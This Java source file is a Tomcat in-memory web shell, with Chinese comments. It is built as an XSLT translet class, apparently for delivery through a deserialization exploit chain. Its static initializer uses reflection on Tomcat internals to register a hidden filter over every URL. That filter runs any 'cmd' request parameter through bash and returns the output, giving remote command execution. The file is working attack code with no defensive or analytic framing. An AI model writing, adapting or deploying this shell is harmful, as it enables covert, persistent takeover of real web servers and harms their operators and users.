import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

public class FilterShell extends AbstractTranslet implements Serializable,javax.servlet.Filter {

    private static final long serialVersionUID = -5971610431559700674L;

    static {
        try {
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webappClassLoaderBase.getResources().getContext();
            //获取standardContext的context
            java.lang.reflect.Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext)context.get(standardContext);
            //获取org.apache.catalina.core.ApplicationContext的service
            java.lang.reflect.Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) service.get(applicationContext);
            //获取org.apache.catalina.core.StandardService的connectors
            java.lang.reflect.Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectorsField.setAccessible(true);
            org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[])connectorsField.get(standardService);
            //获取org.apache.coyote.AbstractProtocol的handler
            org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
            java.lang.reflect.Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
            handlerField.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) handlerField.get(protocolHandler);
            //获取内部类ConnectionHandler的global
            java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
            globalField.setAccessible(true);
            org.apache.coyote.RequestGroupInfo global = (org.apache.coyote.RequestGroupInfo) globalField.get(handler);
            //获取org.apache.coyote.RequestGroupInfo的processors
            java.lang.reflect.Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            processors.setAccessible(true);
            java.util.List RequestInfolist = (java.util.List)processors.get(global);
            //获取org.apache.catalina.connector.Response，并做输出处理
            java.lang.reflect.Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            req.setAccessible(true);
            for(int i = 0; i < RequestInfolist.size(); i++){//遍历
                org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(RequestInfolist.get(i));//获取request
                org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request)request1.getNote(1);//获取catalina.connector.Request类型的org.apache.catalina.connector.Request

                org.apache.catalina.connector.Response response2 = request2.getResponse();
                java.io.Writer w = response2.getWriter();//获取java.io.Writer
                java.lang.reflect.Field responseField = org.apache.catalina.connector.ResponseFacade.class.getDeclaredField("response");
                responseField.setAccessible(true);
                java.lang.reflect.Field usingWriter = org.apache.catalina.connector.Response.class.getDeclaredField("usingWriter");
                usingWriter.setAccessible(true);
                usingWriter.set(response2, Boolean.FALSE);//初始化

                // 获取 org.apache.catalina.core.StandardContext
                javax.servlet.ServletContext servletContext = request2.getSession().getServletContext();

                java.lang.reflect.Field appctx = servletContext.getClass().getDeclaredField("context");
                appctx.setAccessible(true);
                applicationContext = (org.apache.catalina.core.ApplicationContext) appctx.get(servletContext);

                java.lang.reflect.Field stdctx = applicationContext.getClass().getDeclaredField("context");
                stdctx.setAccessible(true);
                standardContext = (org.apache.catalina.core.StandardContext) stdctx.get(applicationContext);


                // 从 standardContext 得到 filterConfigs ，可以认为是 filter-name 和 filter-class 的 pairs
                java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);


                // 创建新 filter
                final String name = "1nhann";
                if (filterConfigs.get(name) == null){
                    javax.servlet.Filter filter = new FilterShell();
                    // 创建 filterDef
                    org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
                    filterDef.setFilter(filter);
                    filterDef.setFilterName(name);
                    filterDef.setFilterClass(filter.getClass().getName());

                    // 将filterDef添加到filterDefs中
                    standardContext.addFilterDef(filterDef);

                    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
                    filterMap.addURLPattern("/*");
                    filterMap.setFilterName(name);
                    filterMap.setDispatcher(javax.servlet.DispatcherType.REQUEST.name());

                    standardContext.addFilterMapBefore(filterMap);

                    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class,org.apache.tomcat.util.descriptor.web.FilterDef.class);
                    constructor.setAccessible(true);
                    org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

                    filterConfigs.put(name,filterConfig);
                }

            }

        }catch (Exception e){

        }
    }

    public FilterShell() throws Exception{
        namesArray = new String[]{"fuck"};
    }

    public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


    @Override
    public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}

    @Override
    public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {

    }

    @Override
    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {
        javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null){
            byte[] bytes = new byte[1024];
            Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();
            int len = process.getInputStream().read(bytes);
            servletResponse.getWriter().write(new String(bytes,0,len));
            process.destroy();
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
